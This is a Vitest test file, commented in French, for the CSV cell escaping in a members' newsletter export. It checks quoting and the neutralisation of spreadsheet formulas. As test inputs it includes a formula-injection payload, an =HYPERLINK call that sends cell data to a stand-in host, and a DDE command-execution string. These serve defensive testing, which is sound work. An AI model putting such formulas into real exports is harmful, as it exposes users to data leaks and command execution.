// Export CSV de la lettre d'info (GET /api/membres/lettre-info.csv) : cellule `csv()` de src/lib/members/endpoints.ts —
// séparateur « ; », guillemets et retours à la ligne, et neutralisation des formules (= + - @, tabulation) pour Excel.
import { describe, expect, it, vi } from 'vitest'
import { csv } from '@/lib/members/endpoints'
import { isEmailAddress } from '@/lib/members/shared'

// endpoints.ts importe session.ts, qui charge toute la configuration Payload (laquelle importe endpoints.ts) : remplacé par
// un module vide, la cellule CSV n'en dépend pas
vi.mock('@/lib/members/session', () => ({
  NO_COUNTS: {},
  clearCookies: vi.fn(),
  memberFromHeaders: vi.fn(),
  sameOrigin: vi.fn(),
  sessionCookies: vi.fn(),
  toProfile: vi.fn(),
}))

/** Lecture d'une ligne CSV « ; » comme un tableur (RFC 4180 : guillemets, guillemets doublés, retours à la ligne). */
function parseLine(line: string): string[] {
  const cells: string[] = []
  let cell = ''
  let quoted = false
  for (let i = 0; i < line.length; i++) {
    const c = line[i]
    if (quoted) {
      if (c === '"' && line[i + 1] === '"') {
        cell += '"'
        i++
      } else if (c === '"') quoted = false
      else cell += c
    } else if (c === '"' && cell === '') quoted = true
    else if (c === ';') {
      cells.push(cell)
      cell = ''
    } else cell += c
  }
  cells.push(cell)
  return cells
}

const FORMULA = /^[=+\-@\t\r]/

describe('csv : cellule de l’export de la lettre d’info', () => {
  it('une valeur ordinaire reste telle quelle', () => {
    const plain = ['Jeanne', 'jeanne.martin@exemple.fr', 'Haute-Savoie', 'Auvergne-Rhône-Alpes', '2026-10-21', '']
    for (const v of [...plain, 'Jean-Pierre', 'a=b', 'Marie@Lyon', "L'Isle"]) {
      expect(csv(v), v).toBe(v)
    }
  })

  it('point-virgule : la cellule est mise entre guillemets', () => {
    expect(csv('Dupont; Martin')).toBe('"Dupont; Martin"')
    expect(csv(';')).toBe('";"')
  })

  it('guillemets : doublés, et cellule entre guillemets', () => {
    expect(csv('Jean "Jojo"')).toBe('"Jean ""Jojo"""')
    expect(csv('"')).toBe('""""')
  })

  it('retours à la ligne : cellule entre guillemets', () => {
    expect(csv('ligne 1\nligne 2')).toBe('"ligne 1\nligne 2"')
    expect(csv('ligne 1\r\nligne 2')).toBe('"ligne 1\r\nligne 2"')
    expect(csv('ligne 1\rligne 2')).toBe('"ligne 1\rligne 2"')
  })

  it('formules neutralisées par une apostrophe en tête : = + - @ et tabulation', () => {
    expect(csv('=1+1')).toBe("'=1+1")
    expect(csv('+33 6 12 34 56 78')).toBe("'+33 6 12 34 56 78")
    expect(csv('-2+3')).toBe("'-2+3")
    expect(csv('@SOMME(A1:A9)')).toBe("'@SOMME(A1:A9)")
    expect(csv('\t=1+1')).toBe("'\t=1+1")
    // retour chariot en tête : neutralisé, puis entre guillemets
    expect(csv('\r=1+1')).toBe('"\'\r=1+1"')
  })

  it('formule piégée avec séparateur et guillemets : neutralisée puis entre guillemets', () => {
    expect(csv('=HYPERLINK("https://piege.example/?d="&C2;"Cliquez ici")')).toBe('"\'=HYPERLINK(""https://piege.example/?d=""&C2;""Cliquez ici"")"')
    expect(csv('=cmd|\' /C calc\'!A0')).toBe("'=cmd|' /C calc'!A0")
  })

  it('une adresse e-mail acceptée à l’inscription peut commencer par un signe de formule : elle est neutralisée', () => {
    for (const email of ['=1+2@exemple.fr', '+lettre@exemple.fr', '-jean@exemple.fr']) {
      expect(isEmailAddress(email), email).toBe(true)
      expect(csv(email)).toBe(`'${email}`)
    }
  })

  it('relue par un tableur, chaque valeur reste dans sa cellule et aucune cellule ne commence par une formule', () => {
    const values = ['Jeanne', 'a;b', 'a"b', 'a\nb', '=1;2', '"', ';', '\r\n', '"=x"', '=HYPERLINK("x";"y")', '+;-', '@"', '-', 'fin;']
    const line = values.map(csv).join(';')
    const cells = parseLine(line)
    expect(cells).toHaveLength(values.length)
    cells.forEach((cell, i) => {
      expect(cell, JSON.stringify(values[i])).toBe(FORMULA.test(values[i]) ? `'${values[i]}` : values[i])
      expect(FORMULA.test(cell), JSON.stringify(values[i])).toBe(false)
    })
  })
})
